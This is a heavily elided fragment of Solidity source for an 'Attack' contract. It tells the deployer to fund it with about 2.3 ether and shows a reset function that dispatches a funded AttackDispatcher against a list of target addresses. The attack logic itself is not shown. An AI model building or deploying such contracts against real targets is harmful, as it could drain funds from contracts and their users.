 ...
 * parameter. Make sure to send at least 2 ether and 305843009213693953 wei to the attack
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x2000000000000001; /* equals 2 ether and 305843009213693953 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[0] = new AttackDispatcher{value: 2305843009213693952 }(0, _targets);
    }
